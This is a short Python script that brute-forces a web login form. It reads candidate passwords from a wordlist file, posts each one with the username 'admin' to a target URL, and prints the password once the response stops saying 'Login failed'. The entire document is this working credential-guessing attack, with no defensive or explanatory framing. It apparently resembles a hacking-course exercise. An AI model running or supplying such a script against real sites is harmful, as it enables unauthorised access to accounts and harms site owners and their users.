#!/usr/bin/env python

import requests

target_url = ""
data = {"username":"admin", "password":"","Login":"submit"}


# Using brute force to guess login
with open("password.txt","r") as file:
    for line in file:
        # Removing \n
        password = line.strip()
        data["password"] = password
        # Sending POST request to target url with dictionaries
        response = requests.post(target_url, data=data)
        if "Login failed" not in response.content:
            print "[+] Got the password"
            print password
            exit()

print "[+] Reached end of file"
